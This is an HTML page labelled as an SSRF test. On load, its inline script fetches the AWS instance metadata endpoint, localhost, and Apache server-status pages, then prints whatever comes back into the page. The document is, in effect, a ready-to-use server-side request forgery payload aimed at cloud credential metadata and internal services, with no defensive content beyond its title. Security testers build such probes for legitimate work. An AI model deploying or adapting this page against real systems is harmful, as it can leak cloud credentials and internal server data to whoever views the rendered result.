<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF Test Page</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { max-width: 600px; margin: 50px auto; text-align: center; }
        #ssrfResult { margin-top: 20px; padding: 10px; border: 1px solid #ddd; background-color: #f9f9f9; display: none; }
        pre { text-align: left; }
    </style>
</head>
<body>
    <div class="container">
        <h1>SSRF Testing Page</h1>
        <p>This page attempts to fetch data from common internal services to test for SSRF vulnerabilities.</p>
        
        <!-- SSRF Results will be displayed here -->
        <div id="ssrfResult">
            <h2>SSRF Request Data</h2>
            <pre id="resultData"></pre>
        </div>

        <script>
            // Function to fetch from multiple potential internal services and log the result
            const logSSRF = async () => {
                const urls = [
                    'http://169.254.169.254/latest/meta-data/',  // AWS Metadata
                    'http://127.0.0.1/',                        // Localhost
                    'http://localhost/',                        // Localhost
                    'http://127.0.0.1/server-status',           // Apache server-status
                    'http://localhost/server-status'            // Apache server-status
                ];

                let result = '';
                
                for (const url of urls) {
                    try {
                        let response = await fetch(url, { method: 'GET' });
                        let data = await response.text();
                        result += `Fetched from ${url}:\n${data}\n\n`;
                    } catch (error) {
                        result += `Error fetching from ${url}: ${error.message}\n\n`;
                    }
                }

                // Display the results on the webpage
                document.getElementById('ssrfResult').style.display = 'block';
                document.getElementById('resultData').innerText = result;
            };

            // Trigger the logging function when the page loads
            logSSRF();
        </script>
    </div>
</body>
</html>
